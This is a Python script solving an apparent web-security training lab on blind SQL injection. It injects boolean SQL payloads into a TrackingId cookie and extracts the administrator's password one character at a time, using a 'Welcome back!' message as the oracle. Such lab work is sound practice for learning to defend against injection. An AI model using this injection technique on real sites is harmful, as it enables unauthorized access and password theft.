import requests
import string

url = "https://ac8d1f5d1ec6abbd801318b800ed00a7.web-security-academy.net/"


# This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
# The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
# The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
# To solve the lab, log in as the administrator user. 

session = requests.Session()

response = session.get(url)
cookies = session.cookies.get_dict()

# print (cookies['TrackingId'])
cookies['TrackingId'] = "' or '1'='1"
cookies['TrackingId'] = "' or (select username from users where username='administrator' limit 1 ) ='administrator"
cookies['TrackingId'] = "' or (select length(username) from users where username='administrator' limit 1 ) ='13"

# for x in range(1,30):
# 	cookies['TrackingId'] = "' or (select length(password) from users where username='administrator' limit 1 ) ='" + str(x)
# 	# print(cookies)
# 	r = requests.get(url, cookies=cookies)
# 	if 'Welcome back!' in r.text:
# 		print (str(x) + " Yes")
cookies['TrackingId'] = "' or (select length(password) from users where username='administrator' limit 1 ) ='20"

for x in range(1,21):

	for y in string.printable:
		cookies['TrackingId'] = "' or SUBSTRING((select password from users where username='administrator' limit 1),"+str(x)+",1) ='"+y
		r = requests.get(url, cookies=cookies)
		if 'Welcome back!' in r.text:
			print (y + " Yes")
			break
	# break;